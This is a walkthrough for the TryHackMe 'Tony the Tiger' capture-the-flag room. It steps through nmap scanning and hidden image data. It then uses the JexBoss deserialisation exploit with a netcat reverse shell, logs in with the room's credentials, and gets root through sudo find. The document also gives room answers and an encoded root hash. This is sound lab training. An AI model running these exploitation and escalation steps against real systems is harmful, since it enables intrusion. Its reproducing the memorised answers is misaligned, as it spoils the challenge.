# [Tony the Tiger](https://tryhackme.com/room/tonythetiger)

## Learn how to use a Java Serialisation attack in this boot-to-root

# Support Material

### What is a great IRL example of an "Object"?

1. **Answer**: `lamp`

**Explanation:** In object-oriented programming, an object is an instance of a class that contains both data (attributes) and methods (functions). A lamp is a perfect real-world analogy because it has properties (color, size, wattage) and behaviors (turn on, turn off, dim).

---

### What is the acronym of a possible type of attack resulting from a "serialisation" attack?

1. **Answer:** `dos`

**Explanation:** Serialization attacks can lead to Denial of Service (DoS) attacks. When malicious serialized objects are deserialized, they can consume excessive system resources, crash applications, or cause infinite loops, effectively denying service to legitimate users.

---

### What lower-level format does data within "Objects" get converted into?

1. **Answer:** `byte stream`

**Explanation:** During serialization, objects are converted into a sequence of bytes (byte stream) that can be stored in files, transmitted over networks, or stored in databases. This process allows objects to be reconstructed later through deserialization.

---

# Reconnaissance

## Your first reaction to being presented with an instance should be information gathering.

### What service is running on port "8080"

1. Perform a service version scan using nmap
   - **Answer:** `Apache Tomcat/Coyote JSP engine 1.1`

```bash
nmap -sV IP
```

![SCREEN01](https://github.com/user-attachments/assets/01355fb5-ece0-41b8-b50f-e4b12bae76f3)

---

### What is the name of the front-end application running on "8080"?

1. Navigate to the web application in your browser `http://IP:8080/`
   - **Answer:** `JBoss`

![SCREEN02](https://github.com/user-attachments/assets/833f507e-6f93-4384-a4bf-fb764c743afc)

---

# Find Tony's Flag!

## Tony has started a totally unbiased blog about taste-testing various cereals! He'd love for you to have a read...

### This flag will have the formatting of "THM{}"

1. Navigate to `http://IP/`, and read through the blog posts to understand the context
   - In the `http://IP/posts/my-first-post/` the post mentions: `any photos I post must have a deeper meaning`. This is a hint that images contain hidden information
   - Download the image file from `http://IP/posts/frosted-flakes/`, and extract hidden data from it using strings

```bash
strings be2sOV9.jpg
```

![SCREEN03](https://github.com/user-attachments/assets/8ee94db0-9e79-4ef1-a346-8aded53a97d9)

---

# Find User JBoss' flag!

### This flag has the formatting of "THM{}"

1. Set up a netcat listener for reverse shell. Clone, prepare and run the JexBoss exploitation tool. Then access the compromised system and locate the flag

```bash
nc -lvnp 4444
```

```bash
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss/
pip install -r requires.txt
python jexboss.py -host http://10.10.111.229:8080
# First question: Answer `No`
# Second question: Answer `Yes`
# Provide your attacker IP address, and the port number
```

```bash
ls -la /home/jboss
cat /home/jboss/.jboss.txt
```

![SCREEN04](https://github.com/user-attachments/assets/ca7bfc18-b7f6-45a7-b6d6-7b3d80cb1e65)

---

# Escalation!

### The final flag does not have the formatting of "THM{}"

_We will, we will Rock You..._

1. Stabilize the shell and gather credentials
   - credentials are: `jboss:likeaboss`

```bash
cat /home/jboss/note
python -c 'import pty; pty.spawn("/bin/bash")'
su jboss
```

2. Enumerate sudo privileges, and exploit sudo find privilege using [GTFOBins](https://gtfobins.github.io/gtfobins/find/) to get encoded root flag
   - Hash is: `QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==`

```bash
sudo -l
sudo find . -exec /bin/sh \; -quit
cat /root/root.txt
```

![SCREEN05](https://github.com/user-attachments/assets/41ec7783-9fb1-45c6-b8ff-db9d34f9fdb8)

3. Navigate to [CyberChef](https://gchq.github.io/CyberChef/), and use "From Base64" operation to decode the hash. Crack decoded hash in [CrackStation](https://crackstation.net/)

![SCREEN06](https://github.com/user-attachments/assets/a32427d2-ceab-43e2-8351-79ffb7317eb7)
